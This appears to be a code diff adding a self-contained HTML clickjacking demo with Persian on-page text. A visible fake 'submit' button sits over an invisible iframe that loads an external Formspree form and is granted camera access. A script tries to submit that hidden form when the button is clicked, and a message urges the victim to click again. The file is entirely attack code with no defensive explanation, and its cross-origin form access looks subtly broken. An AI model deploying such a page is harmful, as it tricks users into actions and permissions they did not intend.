@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clickjacking Example with Formspree</title>
+  <style>
+    body {
+      text-align: center;
+      margin-top: 100px;
+      font-family: Tahoma, Arial, sans-serif;
+    }
+
+    #fakeButton {
+      position: relative;
+      z-index: 2;
+      padding: 20px 40px;
+      font-size: 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    #realIframe {
+      position: absolute;
+      top: 150px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      height: 300px;
+      opacity: 0; /* iframe نامرئی */
+      z-index: 1;
+      pointer-events: auto;
+    }
+
+    p {
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <h2>برای ارسال فرم، روی دکمه کلیک کنید!</h2>
+
+  <!-- دکمه جعلی -->
+  <button id="fakeButton">ارسال فرم</button>
+
+  <!-- iframe مخفی با فرم Formspree -->
+  <iframe id="realIframe" src="https://formspree.io/f/xkgrwvde" allow="camera" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+
+  <p>اگر فرم ارسال نشد، لطفاً دوباره روی دکمه کلیک کنید.</p>
+
+  <script>
+    // وقتی روی دکمه جعلی کلیک شد، فرم واقعی ارسال می‌شود
+    document.getElementById('fakeButton').onclick = function() {
+      document.getElementById('realIframe').contentWindow.document.querySelector('form').submit();
+    };
+  </script>
+
+</body>
+</html>
